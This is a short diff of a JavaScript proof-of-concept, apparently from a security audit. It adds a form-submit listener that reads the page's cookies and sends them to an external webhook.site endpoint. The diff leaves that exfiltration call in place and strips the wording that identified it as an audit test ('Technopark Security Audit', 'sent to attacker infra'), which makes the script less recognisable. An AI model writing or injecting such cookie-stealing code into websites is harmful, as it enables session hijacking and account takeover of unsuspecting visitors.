@@ -1,4 +1,4 @@
-console.log("Technopark Security Audit: PoC Active");
+console.log("PoC Active");
 
 document.addEventListener('submit', function (e) {
 
@@ -10,5 +10,5 @@ document.addEventListener('submit', function (e) {
     const sessionData = document.cookie;
     fetch(`https://webhook.site/8a2e9962-567c-4e65-866e-f7b5145ba653/cookies?data=${encodeURIComponent(sessionData)}`);
     
-    alert("PoC: Credentials captured and sent to attacker infra.");
+    alert("PoC: Credentials captured");
 });
